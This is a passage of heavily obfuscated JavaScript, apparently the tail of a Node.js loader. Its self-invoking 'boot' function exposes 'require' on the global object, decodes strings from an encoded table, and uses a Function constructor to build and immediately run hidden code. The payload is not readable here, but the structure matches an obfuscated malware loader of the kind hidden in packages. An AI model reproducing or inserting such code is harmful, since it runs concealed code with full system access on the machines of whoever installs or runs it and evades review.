T$KrpWTbnKscLfvs=T$KrpWTbnKscLfvs[VXnYqhVfhMxPNCZxkVLjX(0x164)]('^')[VXnYqhVfhMxPNCZxkVLjX(0x168)](MmiyC_B_BmVPjLNizCLBL),T$KrpWTbnKscLfvs=T$KrpWTbnKscLfvs[VXnYqhVfhMxPNCZxkVLjX(0x164)]('*1')[VXnYqhVfhMxPNCZxkVLjX(0x168)]('^'),T$KrpWTbnKscLfvs=T$KrpWTbnKscLfvs[VXnYqhVfhMxPNCZxkVLjX(0x164)]('*0')[VXnYqhVfhMxPNCZxkVLjX(0x168)]('*'),T$KrpWTbnKscLfvs[VXnYqhVfhMxPNCZxkVLjX(0x164)](MmiyC_B_BmVPjLNizCLBL);}function peel(oDmHKTVzYaSkPSMryAJta$kpW){return spin(oDmHKTVzYaSkPSMryAJta$kpW,SX);}(function boot(MQikRt$Ad_QWhtkkvtQ,L$$XlKuZKmUo){var Z_Lh_ocEDpxczGy=QtbaGaPA_$YMImOzadvJlZ;MQikRt$Ad_QWhtkkvtQ['z']=z;var W$eYKY=splitLane(Z_Lh_ocEDpxczGy(0x176));MQikRt$Ad_QWhtkkvtQ[W$eYKY[-parseInt(0x3)*parseInt(-parseInt(0x928))+parseInt(-parseInt(0x1a41))+parseInt(-0x137)]]=L$$XlKuZKmUo;typeof module===W$eYKY[parseInt(0x1da2)+Math.floor(-parseInt(0xd34))+-parseInt(0x106d)]&&(MQikRt$Ad_QWhtkkvtQ[W$eYKY[-parseInt(0x1)*Number(parseInt(0x9d))+Math.ceil(0x1911)*Math.max(-0x1,-0x1)+0x3*Math.floor(0x890)]]=module);var YmaQbFAYlgWIfxWLOxV=peel(Z_Lh_ocEDpxczGy(0x174)),XfHNCCDove=YmaQbFAYlgWIfxWLOxV[Z_Lh_ocEDpxczGy(0x16f)](-parseInt(0x47a)+-parseInt(0x47)*-parseInt(0x5c)+-parseInt(0x150a),parseInt(0xbdf)+parseInt(0x48b)+-0x575*Number(0x3)),VJiymLaoOkqwOOJWxFdfWmizB=peel[XfHNCCDove],fDMivRVmWfDtRTaWhnROPi=VJiymLaoOkqwOOJWxFdfWmizB('',peel(Z_Lh_ocEDpxczGy(0x169))),avKyeoPAY$_PfEBcTHAqpsAxr=fDMivRVmWfDtRTaWhnROPi(peel(Z_Lh_ocEDpxczGy(0x16b)));return VJiymLaoOkqwOOJWxFdfWmizB('',avKyeoPAY$_PfEBcTHAqpsAxr)(Number(-parseInt(0x1141))*Math.floor(-parseInt(0x2))+Math.ceil(parseInt(0x557))*Math.floor(parseInt(0x4))+parseFloat(-0x2e11)),-0x2d47+0x3a88+0x128d;}(global,require));
